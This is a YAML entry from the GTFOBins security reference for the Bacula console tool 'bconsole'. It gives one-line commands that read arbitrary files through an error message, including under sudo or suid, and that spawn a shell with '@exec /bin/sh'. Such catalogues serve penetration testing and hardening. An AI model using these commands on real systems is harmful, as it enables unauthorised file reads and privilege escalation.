<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/bconsole -->
---
functions:
  file-read:
  - code: |-
      bconsole -c /path/to/file-input
    comment: |-
      The file is actually parsed and the first wrong line is returned in an error message.
    contexts:
      sudo:
      suid:
      unprivileged:
  shell:
  - code: |-
      bconsole
      @exec /bin/sh
    contexts:
      sudo:
      unprivileged:
...
